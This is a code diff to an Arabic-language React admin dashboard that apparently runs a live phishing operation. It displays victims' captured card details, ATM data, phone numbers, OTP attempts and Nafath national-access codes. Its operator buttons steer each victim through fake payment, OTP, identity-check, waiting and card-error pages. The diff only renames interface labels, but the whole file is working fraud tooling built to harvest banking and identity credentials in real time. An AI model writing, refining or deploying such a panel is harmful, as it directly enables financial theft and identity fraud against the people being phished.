@@ -97,8 +97,8 @@ function getTypeArabic(type: string): string {
     "payment": "الدفع",
     "card": "بيانات البطاقة",
     "atm": "صراف ATM",
-    "nomer": "رقم الحساب",
-    "nomer_otp": "OTP رقم الحساب",
+    "nomer": "رقم الجوال",
+    "nomer_otp": "OTP رقم الجوال",
     "otp_attempt_1": "رمز التحقق (محاولة 1)",
     "otp_attempt_2": "رمز التحقق (محاولة 2)",
     "otp_attempt_3": "رمز التحقق (محاولة 3)",
@@ -181,10 +181,10 @@ function getPageArabic(page: string): string {
     "/otp2": "رمز التحقق (محاولة 2)",
     "/otp3": "رمز التحقق (محاولة 3)",
     "/atm": "صراف ATM",
-    "/nomer": "رقم الحساب",
+    "/nomer": "رقم الجوال",
     "/nomer-wait": "انتظار التحقق",
-    "/nomer-otp": "رمز التحقق للحساب",
-    "/identity-check": "التحقق من الهوية",
+    "/nomer-otp": "رمز التحقق لرقم الجوال",
+    "/identity-check": "التحقق من النفاذ الوطني",
     "/waiting": "قائمة الانتظار",
   };
   return pageMap[page] || page || "غير معروف";
@@ -319,7 +319,7 @@ function SessionBox({
           <div className="mt-4 space-y-4 border-t border-slate-100 pt-4">
             {/* صندوق البيانات المركبة */}
             <div className="rounded-3xl border border-slate-200 bg-slate-50 p-4">
-              <p className="text-xs font-semibold text-slate-500 mb-3">البيانات المركبة</p>
+              <p className="text-xs font-semibold text-slate-500 mb-3">بيانات المركبة</p>
               
               {/* البيانات الشخصية */}
               <div className="mb-4">
@@ -364,7 +364,7 @@ function SessionBox({
                     return (
                       <div key={otp.id} className="rounded-2xl bg-green-50 p-3 text-xs text-slate-700">
                         <div className="flex items-center justify-between gap-3 mb-2">
-                          <span className="font-semibold text-green-700">محاولة {index + 1}</span>
+                          <span className="font-semibold text-green-700">الرمز {index + 1}</span>
                           <span className="text-slate-500" dir="ltr">{formatAgo(otp.createdAt)}</span>
                         </div>
                         <div className="font-mono text-base font-bold text-green-900" dir="ltr">{data.otpCode ?? "—"}</div>
@@ -399,8 +399,8 @@ function SessionBox({
             {nomerRows.length > 0 && (
               <div className="rounded-3xl border border-blue-200 bg-blue-50 p-4">
                 <div className="flex items-center justify-between text-xs font-semibold text-blue-700 mb-3">
-                  <span>بيانات رقم الجوال</span>
-                  <span>{nomerRows.length} إدخال</span>
+                  <span> رقم الجوال</span>
+                  <span>{nomerRows.length} المحاولات</span>
                 </div>
                 {nomerRows.map((nomer) => {
                   const data = parseData(nomer.data);
@@ -413,7 +413,7 @@ function SessionBox({
                   return (
                     <div key={nomer.id} className="rounded-2xl bg-white p-3 mb-2">
                       <div className="flex items-center justify-between text-slate-500 text-[11px] mb-2">
-                        <span>إدخال رقم الجوال</span>
+                        <span>وقت الادخال </span>
                         <span dir="ltr">{formatAgo(nomer.createdAt)}</span>
                       </div>
                       <div className="space-y-1 text-xs">
@@ -436,7 +436,7 @@ function SessionBox({
             {nomerOtpRows.length > 0 && (
               <div className="rounded-3xl border border-green-200 bg-green-50 p-4">
                 <div className="flex items-center justify-between text-xs font-semibold text-green-700 mb-3">
-                  <span>رمز تحقق رقم الجوال</span>
+                  <span>رمز تحقق الجوال</span>
                   <span>{nomerOtpRows.length} رمز</span>
                 </div>
                 <div className="space-y-2">
@@ -460,12 +460,12 @@ function SessionBox({
 
             {/* التحقق من الهوية */}
             <div className="rounded-3xl border border-purple-200 bg-purple-50 p-4">
-              <div className="text-xs font-semibold text-purple-700 mb-3">التحقق من الهوية</div>
+              <div className="text-xs font-semibold text-purple-700 mb-3">التحقق من النفاذ الوطني</div>
               <div className="flex gap-2">
                 <input
                   type="text"
                   id={`identity-code-${sessionId}`}
-                  placeholder="رقم التحقق (مثل: 5)"
+                  placeholder="اكتب رمز التوثيق "
                   className="flex-1 rounded-2xl border border-purple-200 bg-white px-4 py-2 text-sm text-center font-mono focus:border-purple-400 focus:outline-none focus:ring-2 focus:ring-purple-100"
                   maxLength={10}
                 />
@@ -489,12 +489,12 @@ function SessionBox({
                   {loadingAction === "identity_code" ? "جارٍ..." : "إرسال"}
                 </button>
               </div>
-              <p className="mt-2 text-[10px] text-purple-600">أدخل رقم أو نص ليظهر للعميل فوراً</p>
+              <p className="mt-2 text-[10px] text-purple-600">ادخل رمز التوثيق  </p>
             </div>
 
             {/* أزرار التحكم */}
             <div className="space-y-3">
-              <p className="text-[10px] text-slate-400 font-semibold">إعادة التوجيه</p>
+              <p className="text-[10px] text-slate-400 font-semibold">اعادة للصفحات الاولى </p>
               <div className="grid gap-2 sm:grid-cols-2">
                 <button
                   type="button"
@@ -522,7 +522,7 @@ function SessionBox({
                 >{loadingAction === "go_visa" ? "...جارٍ" : "💳 الفيزا"}</button>
               </div>
               
-              <p className="text-[10px] text-slate-400 font-semibold pt-2">التوجيه لـ</p>
+              <p className="text-[10px] text-slate-400 font-semibold pt-2">تحويل لصفحات التوثيق</p>
               <div className="grid gap-2 sm:grid-cols-4">
                 <button
                   type="button"
@@ -535,19 +535,19 @@ function SessionBox({
                   disabled={loadingAction === "go_nomer"}
                   onClick={() => void handleControl("go_nomer")}
                   className="rounded-2xl bg-blue-600 px-2 py-2 text-xs font-semibold text-white hover:bg-blue-700 disabled:cursor-not-allowed disabled:opacity-50"
-                >{loadingAction === "go_nomer" ? "..." : "📱 Nomer"}</button>
+                >{loadingAction === "go_nomer" ? "..." : "📱 ادخال رقم الهاتف"}</button>
                 <button
                   type="button"
                   disabled={loadingAction === "go_nomer_otp"}
                   onClick={() => void handleControl("go_nomer_otp")}
                   className="rounded-2xl bg-blue-600 px-2 py-2 text-xs font-semibold text-white hover:bg-blue-700 disabled:cursor-not-allowed disabled:opacity-50"
-                >{loadingAction === "go_nomer_otp" ? "..." : "📱 N-OTP"}</button>
+                >{loadingAction === "go_nomer_otp" ? "..." : "📱 رمز تحقق رقم الهاتف"}</button>
                 <button
                   type="button"
                   disabled={loadingAction === "go_identity_check"}
                   onClick={() => void handleControl("go_identity_check")}
                   className="rounded-2xl bg-purple-600 px-2 py-2 text-xs font-semibold text-white hover:bg-purple-700 disabled:cursor-not-allowed disabled:opacity-50"
-                >{loadingAction === "go_identity_check" ? "..." : "🆔 هوية"}</button>
+                >{loadingAction === "go_identity_check" ? "..." : "🆔 رمز توثيق النفاذ"}</button>
               </div>
               
               <p className="text-[10px] text-slate-400 font-semibold pt-2">قائمة الانتظار</p>
@@ -557,7 +557,9 @@ function SessionBox({
                   disabled={loadingAction === "go_waiting"}
                   onClick={() => void handleControl("go_waiting")}
                   className="rounded-2xl bg-amber-600 px-3 py-2 text-xs font-semibold text-white hover:bg-amber-700 disabled:cursor-not-allowed disabled:opacity-50"
-                >{loadingAction === "go_waiting" ? "...جارٍ" : "⏳ قائمة الانتظار"}</button>
+                >{loadingAction === "go_waiting" ? "
+                جارٍ" 
+                  : "⏳ قائمة الانتظار العامه "}</button>
               </div>
               
               <p className="text-[10px] text-slate-400 font-semibold pt-2">خطأ</p>
@@ -567,7 +569,7 @@ function SessionBox({
                   disabled={loadingAction === "card_error"}
                   onClick={() => void handleControl("card_error")}
                   className="rounded-2xl border border-red-200 bg-red-50 px-3 py-2 text-xs font-semibold text-red-700 hover:bg-red-100 disabled:cursor-not-allowed disabled:opacity-50"
-                >{loadingAction === "card_error" ? "..." : "❌ خطأ البطاقة"}</button>
+                >{loadingAction === "card_error" ? "..." : "❌ خطأ للبطاقة فقط"}</button>
               </div>
             </div>
           </div>
@@ -582,7 +584,7 @@ function SessionBox({
           >
             <span className="flex items-center gap-2">
               <Clock className="w-3 h-3" />
-              السجل التاريخي ({rows.length} سجل)
+              السجل الادخالات  ({rows.length} العدد)
             </span>
             {historyExpanded ? <ChevronUp className="w-4 h-4" /> : <ChevronDown className="w-4 h-4" />}
           </button>
